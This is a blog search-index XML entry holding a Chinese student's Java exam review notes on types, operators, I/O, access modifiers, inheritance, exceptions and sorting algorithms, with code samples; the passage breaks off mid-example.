<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java复习笔记</title>
      <link href="/2021/02/16/javabiji/"/>
      <url>/2021/02/16/javabiji/</url>
      
        <content type="html"><![CDATA[<blockquote><p>考试96分, 仅供考试参考, 并不代表Java的知识体系. </p></blockquote><a id="more"></a><h2 id="基础考点"><a href="#基础考点" class="headerlink" title="基础考点"></a>基础考点</h2><ol><li><p>命名规则</p><p>类使用大驼峰命名, 方法一般使用小驼峰.<br>首字母只能用 ‘_’ ‘$’ 以及字母, 其余部分可以用字母数字下划线和$运算符<br>区分大小写</p></li><li><p>数据类型及其转换<br><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20210107193030149.png" alt="image-20210107193030149"></p><table><thead><tr><th>序号</th><th>数据类型</th><th>大小/位</th><th>封装类</th><th>默认值（零值）</th><th>可表示数据范围</th></tr></thead><tbody><tr><td>1</td><td>byte(字节)</td><td>8-bit</td><td>Byte</td><td>(byte)0</td><td>-128~127</td></tr><tr><td>2</td><td>short(短整数)</td><td>16-bit</td><td>Short</td><td>(short)0</td><td>-32768~32767</td></tr><tr><td>3</td><td>int(整数)</td><td>32-bit</td><td>Integer</td><td>0</td><td>-2147483648~2147483647</td></tr><tr><td>4</td><td>long(长整数)</td><td>64-bit</td><td>Long</td><td>0L</td><td>-9223372036854775808~9223372036854775807</td></tr><tr><td>5</td><td>float(单精度)</td><td>32-bit</td><td>Float</td><td>0.0F</td><td>1.4E-45~3.4028235E38</td></tr><tr><td>6</td><td>double(双精度)</td><td>64-bit</td><td>Double</td><td>0.0D</td><td>4.9E-324~1.7976931348623157E308</td></tr><tr><td>7</td><td>boolean</td><td>but its “size” isn’t something that’s precisely defined.反正我一般把它当作1bit</td><td>Boolean</td><td>false</td><td>true或false</td></tr><tr><td>8</td><td>char(字符)</td><td>16-bit</td><td>Character</td><td>‘\u0000’（对应数字0，输出为空）</td><td>0~65535</td></tr></tbody></table><ul><li>自动类型转换: 低精度可以向高精度自动转换<br>byte-&gt;short,char-&gt; int -&gt; long -&gt; float -&gt; double<br>运算过程中, 不同数据类型先转化成同一个数据类型, 然后进行转换</li></ul><table><thead><tr><th>操作数1类型</th><th>操作数2类型</th><th>转换后的类型</th></tr></thead><tbody><tr><td>byte、short、char</td><td>int</td><td>int</td></tr><tr><td>byte、short、char、int</td><td>long</td><td>long</td></tr><tr><td>byte、short、char、int 、long</td><td>float</td><td>float</td></tr><tr><td>byte、short、char、int 、long、float</td><td>double</td><td>double</td></tr></tbody></table><ul><li>强制类型转换: <code>int a = (int)32.1</code><br><strong>注意:Java浮点数默认是double类型而不是float</strong></li></ul></li><li><p>运算符(应该没必要考吧, 谭浩强太反人类了)</p><table><thead><tr><th>优先级</th><th>运算符</th><th>结合性</th></tr></thead><tbody><tr><td>1</td><td>()、[]、{}</td><td>从左向右</td></tr><tr><td>2</td><td>!、+、-、~、++、–</td><td>从右向左</td></tr><tr><td>3</td><td>*、/、%</td><td>从左向右</td></tr><tr><td>4</td><td>+、-</td><td>从左向右</td></tr><tr><td>5</td><td>«、»、&gt;&gt;&gt;</td><td>从左向右</td></tr><tr><td>6</td><td>&lt;、&lt;=、&gt;、&gt;=、instanceof</td><td>从左向右</td></tr><tr><td>7</td><td>==、!=</td><td>从左向右</td></tr><tr><td>8</td><td>&amp;</td><td>从左向右</td></tr><tr><td>9</td><td>^</td><td>从左向右</td></tr><tr><td>10</td><td>|</td><td>从左向右</td></tr><tr><td>11</td><td>&amp;&amp;</td><td>从左向右</td></tr><tr><td>12</td><td>||</td><td>从左向右</td></tr><tr><td>13</td><td>?:</td><td>从右向左</td></tr><tr><td>14</td><td>=、+=、-=、*=、/=、&amp;=、|=、^=、~=、«=、»=、&gt;&gt;&gt;=</td><td>从右向左</td></tr></tbody></table></li><li><p>数组(字符数组)<br>初始化<code>int[] array = new int[10];int[] array = {1 ,2, 3};</code><br><code>array.length</code>得到的是数组的容量. </p></li><li><p>类的定义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Dog dog = <span class="keyword">new</span> Dog();</span><br><span class="line">        System.out.println(<span class="string">"hello"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="代码分析考点"><a href="#代码分析考点" class="headerlink" title="代码分析考点"></a>代码分析考点</h2><ol><li><p>this关键字用法:</p><p><a href="https://www.cnblogs.com/fuao2000/p/12456094.html" target="_blank" rel="noopener">https://www.cnblogs.com/fuao2000/p/12456094.html</a></p></li><li><p>内部类</p><p><a href="https://www.cnblogs.com/fuao2000/p/14266735.html" target="_blank" rel="noopener">https://www.cnblogs.com/fuao2000/p/14266735.html</a></p></li><li><p><strong>输入输出</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Scanner scanner = <span class="keyword">new</span> Scanner(System.in); <span class="comment">// 创建Scanner对象</span></span><br><span class="line">String name = scanner.nextLine(); <span class="comment">// 读取一行输入并获取字符串</span></span><br><span class="line"><span class="keyword">int</span> age = scanner.nextInt(); <span class="comment">// 读取一行输入并获取整数</span></span><br><span class="line"><span class="keyword">double</span> a = scanner.nextDouble(); <span class="comment">//读取一行double数</span></span><br><span class="line">String name = scanner.next(); <span class="comment">//读字符串, 以空格分隔</span></span><br><span class="line"><span class="keyword">byte</span> b = scanner.nextByte();</span><br><span class="line"><span class="keyword">short</span> s = scanner.nextShort();</span><br><span class="line"><span class="keyword">long</span> l = scanner.nextLong();</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(System.in));  </span><br><span class="line">    BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(<span class="keyword">new</span> FileInputStream(<span class="string">"123.txt"</span>))); </span><br><span class="line">    BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(<span class="keyword">new</span> File(<span class="string">"123.txt"</span>)));</span><br><span class="line">    <span class="comment">//其实还有很多其他的方式读取文件, 但是考试只要会这一种就可以了. </span></span><br><span class="line">String str = <span class="keyword">null</span>;  </span><br><span class="line"><span class="keyword">while</span>((str = br.readline()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">System.out.print(str);</span><br><span class="line">&#125;</span><br><span class="line">    br.close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//写文件</span></span><br><span class="line"><span class="comment">//https://juejin.cn/post/6844903807063687181</span></span><br><span class="line">BufferedWriter writer = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(<span class="string">"123.txt"</span>));</span><br><span class="line">writer.write(<span class="string">"hello,world"</span>);</span><br><span class="line">writer.close();</span><br></pre></td></tr></table></figure></li><li><p><strong>访问权限修饰符</strong></p><table><thead><tr><th align="left">修饰符</th><th align="left">当前类</th><th align="left">同一包内</th><th align="left">子孙类(同一包)</th><th align="left">子孙类(不同包)</th><th align="left">其他包</th></tr></thead><tbody><tr><td align="left"><code>public</code></td><td align="left">Y</td><td align="left">Y</td><td align="left">Y</td><td align="left">Y</td><td align="left">Y</td></tr><tr><td align="left"><code>protected</code></td><td align="left">Y</td><td align="left">Y</td><td align="left">Y</td><td align="left">Y</td><td align="left">N</td></tr><tr><td align="left"><code>default</code></td><td align="left">Y</td><td align="left">Y</td><td align="left">Y</td><td align="left">N</td><td align="left">N</td></tr><tr><td align="left"><code>private</code></td><td align="left">Y</td><td align="left">N</td><td align="left">N</td><td align="left">N</td><td align="left">N</td></tr></tbody></table><p>protected: <a href="https://www.runoob.com/w3cnote/java-protected-keyword-detailed-explanation.html" target="_blank" rel="noopener">https://www.runoob.com/w3cnote/java-protected-keyword-detailed-explanation.html</a></p></li><li><p><strong>接口</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">tuxing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">travel</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">dog</span> <span class="keyword">implements</span> <span class="title">tuxing</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"Mammal eats"</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">travel</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"Mammal travels"</span>);</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>子类父类对象转换</strong><br>子类转父类, 怎么转都可以. </p><p>java中子类强转父类,实际上依然是子类；</p><p>该引用只能调用父类中定义的方法和变量；</p><p>如果子类中重写了父类中的一个方法，那么在调用这个方法的时候，将会调用子类中的这个方法；</p><p>但是变量重名的时候会使用父类的field, 也就是所谓的隐藏. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A是父类,B是子类</span></span><br><span class="line">A a = <span class="keyword">new</span> A();</span><br><span class="line">a.setName(<span class="string">"a1"</span>);</span><br><span class="line">a.sayA(); <span class="comment">// sayA</span></span><br><span class="line"></span><br><span class="line">B b = <span class="keyword">new</span> B();</span><br><span class="line">b.setName(<span class="string">"b1"</span>);</span><br><span class="line">b.setSex(<span class="keyword">true</span>);</span><br><span class="line">b.sayA(); <span class="comment">// sayA from B</span></span><br><span class="line">b.sayB(); <span class="comment">// sayB</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Java中的对象进行类型提升，依然保持其原有的类型。</span></span><br><span class="line">A a2 = (A) b; <span class="comment">// 子类强转父类,其实仍然是子类</span></span><br><span class="line">System.out.println(a2.toString()); <span class="comment">// B [name=b1, age=0, sex=true]</span></span><br><span class="line"><span class="comment">// 该引用只能调用父类中定义的方法和变量； </span></span><br><span class="line"><span class="comment">// a2.sayB(); // The method sayB() is undefined for the type A 报错</span></span><br><span class="line"><span class="comment">// 如果子类中重写了父类中的一个方法，那么在调用这个方法的时候，将会调用子类中的这个方法；</span></span><br><span class="line">a2.sayA(); <span class="comment">// sayA from B a2其实是B,调用的是B方法</span></span><br></pre></td></tr></table></figure><p>只有父类对象本身就是用子类<code>new</code>出来的时候, 才可以在将来被强制转换为子类对象.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// B b2 = (B) a; // atest.A cannot be cast to atest.B a是A,转不成B</span></span><br><span class="line"><span class="comment">// 只有父类对象本身就是用子类new出来的时候, 才可以在将来被强制转换为子类对象.</span></span><br><span class="line">B b2 = (B) a2; <span class="comment">// a2其实是B,可以转成B</span></span><br><span class="line">System.out.println(b2.toString()); <span class="comment">// B [name=b1, sex=true]</span></span><br><span class="line">b2.sayA(); <span class="comment">// sayA from B</span></span><br><span class="line">b2.sayB(); <span class="comment">// sayB</span></span><br></pre></td></tr></table></figure><p>父类转子类, 只有父类对象本身就是用子类new出来的时候, 才可以在将来被强制转换为子类对象.</p></li><li><p>继承,重载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Student.run"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//重载</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>异常处理<br>考试要求看懂就行了, 也就是长脑子都能看懂</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 捕获异常</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    file = <span class="keyword">new</span> FileInputStream(fileName);</span><br><span class="line">    x = (<span class="keyword">byte</span>) file.read();</span><br><span class="line">&#125; <span class="keyword">catch</span>(FileNotFoundException f) &#123; <span class="comment">// Not valid!</span></span><br><span class="line">    f.printStackTrace();</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span>(IOException i) &#123;</span><br><span class="line">    i.printStackTrace();</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span>&#123;</span><br><span class="line">    file.close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 抛出异常</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">className</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deposit</span><span class="params">(<span class="keyword">double</span> amount)</span> <span class="keyword">throws</span> RemoteException </span>&#123;<span class="comment">//告诉调用者可能抛出,需要捕获</span></span><br><span class="line">    <span class="comment">// Method implementation</span></span><br><span class="line">      <span class="comment">// 明确的在方法抛出这个异常</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> RemoteException();</span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">//Remainder of class definition</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="程序题考点"><a href="#程序题考点" class="headerlink" title="程序题考点"></a>程序题考点</h2><ol><li><p>排序算法<br>一般这个考试只可能是冒泡, 选择, 插入, 快排.所以记这四个就够了. </p><p><a href="https://www.cnblogs.com/guoyaohua/p/8600214.html" target="_blank" rel="noopener">https://www.cnblogs.com/guoyaohua/p/8600214.html</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 冒泡排序</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] bubbleSort(<span class="keyword">int</span>[] array) &#123;</span><br><span class="line">        <span class="keyword">if</span> (array.length == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> array;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; array.length - <span class="number">1</span> - i; j++)</span><br><span class="line">                <span class="keyword">if</span> (array[j + <span class="number">1</span>] &lt; array[j]) &#123;</span><br><span class="line">                    <span class="keyword">int</span> temp = array[j + <span class="number">1</span>];</span><br><span class="line">                    array[j + <span class="number">1</span>] = array[j];</span><br><span class="line">                    array[j] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 选择排序</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] selectionSort(<span class="keyword">int</span>[] array) &#123;</span><br><span class="line">        <span class="keyword">if</span> (array.length == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> array;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> minIndex = i;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; array.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (array[j] &lt; array[minIndex]) <span class="comment">//找到最小的数</span></span><br><span class="line">                    minIndex = j; <span class="comment">//将最小数的索引保存</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> temp = array[minIndex];</span><br><span class="line">            array[minIndex] = array[i];</span><br><span class="line">            array[i] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 插入排序</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] insertionSort(<span class="keyword">int</span>[] array) &#123;</span><br><span class="line">        <span class="keyword">if</span> (array.length == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> array;</span><br><span class="line">        <span class="keyword">int</span> current;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            current = array[i + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">int</span> preIndex = i;</span><br><span class="line">            <span class="keyword">while</span> (preIndex &gt;= <span class="number">0</span> &amp;&amp; current &lt; array[preIndex]) &#123;</span><br><span class="line">                array[preIndex + <span class="number">1</span>] = array[preIndex];</span><br><span class="line">                preIndex--;</span><br><span class="line">            &#125;</span><br><span class="line">            array[preIndex + <span class="number">1</span>] = current;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 快速排序方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> start</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> end</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] QuickSort(<span class="keyword">int</span>[] array, <span class="keyword">int</span> start, <span class="keyword">int</span> end) &#123;</span><br><span class="line">        <span class="keyword">if</span> (array.length &lt; <span class="number">1</span> || start &lt; <span class="number">0</span> || end &gt;= array.length || start &gt; end) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">int</span> smallIndex = partition(array, start, end);</span><br><span class="line">        <span class="keyword">if</span> (smallIndex &gt; start)</span><br><span class="line">            QuickSort(array, start, smallIndex - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (smallIndex &lt; end)</span><br><span class="line">            QuickSort(array, smallIndex + <span class="number">1</span>, end);</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 快速排序算法——partition</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> start</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> end</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pivot = (<span class="keyword">int</span>) (start + Math.random() * (end - start + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">int</span> smallIndex = start - <span class="number">1</span>;</span><br><span class="line">        swap(array, pivot, end);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt;= end; i++)</span><br><span class="line">            <span class="keyword">if</span> (array[i] &lt;= array[end]) &#123;</span><br><span class="line">                smallIndex++;</span><br><span class="line">                <span class="keyword">if</span> (i &gt; smallIndex)</span><br><span class="line">                    swap(array, i, smallIndex);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> smallIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 交换数组内两个元素</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> i</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> j</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = array[i];</span><br><span class="line">        array[i] = array[j];</span><br><span class="line">        array[j] = temp;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>线程实现输入一串数字求max,min,avg</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XianCheng</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Thread thread = <span class="keyword">new</span> Thread() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">                <span class="keyword">int</span>[] temp = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; temp.length; i++) &#123;</span><br><span class="line">                    temp[i] = scanner.nextInt();</span><br><span class="line">                    sum += temp[i];</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(sum / <span class="number">10</span>);</span><br><span class="line">                Arrays.sort(temp);</span><br><span class="line">                System.out.println(temp[<span class="number">0</span>]);</span><br><span class="line">                System.out.println(temp[<span class="number">9</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        thread.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>继承实现长方形,三角形,圆形求周长面积</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 